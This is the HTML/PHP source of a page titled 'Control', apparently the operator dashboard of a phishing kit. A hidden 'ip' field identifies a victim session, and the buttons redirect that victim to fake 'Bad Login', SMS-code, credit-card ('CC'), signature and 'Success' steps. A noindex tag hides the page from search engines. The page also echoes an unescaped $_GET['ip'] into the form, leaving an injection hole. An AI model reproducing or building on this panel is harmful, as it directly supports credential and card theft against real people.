<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/helpers.css">
        <link rel="stylesheet" href="assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="assets/imgs/favicon.ico" />

        <title>Control</title>
    </head>

    <body>
        
        <div class="container text-center pt30 pb30">
            <form method="POST" action="index.php">
                <input type="hidden" name="step" value="control">
                <input type="hidden" name="ip" value="<?php echo $_GET['ip']; ?>">
                <button type="submit" class="btn btn-danger" name="to" value="badlogin">Bad Login</button> 
                <button type="submit" class="btn btn-danger" name="to" value="namra">namra</button> 
                <button type="submit" class="btn btn-danger" name="to" value="sms">sms</button> 
                <button type="submit" class="btn btn-danger" name="to" value="cc">CC</button> 
                <button type="button" class="slide btn btn-success" data-slide="#signature" data-value="signature">Signature</button> 
              
                <button type="submit" class="btn btn-success" name="to" value="success">Success</button>
                <div class="collapse mt-5" id="signature">
                    <div class="row">
                        <div class="col-md-8">
                            <input type="text" name="signaturcode" id="signaturcode" class="form-control">
                        </div>
                        <div class="col-md-4">
                            <button type="submit" class="btn btn-primary btn-block" name="to" value="signature">Submit</button> 
                        </div>
                    </div>
                </div>
                <div class="collapse mt-5" id="confirmation">
                    <div class="row">
                    
                        <div class="col-md-2">
                            <button type="submit" class="btn btn-primary btn-block" name="to" value="confirmation">Submit</button> 
                        </div>
                    </div>
                </div>
            </form>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="assets/js/script.js"></script>

        <script>
            $('.slide').click(function(){
                var target = $(this).data('slide');
                var value = $(this).data('value');
                $(target).slideToggle();
                $(target + " button").val(value);
            })
        </script>

    </body>

</html>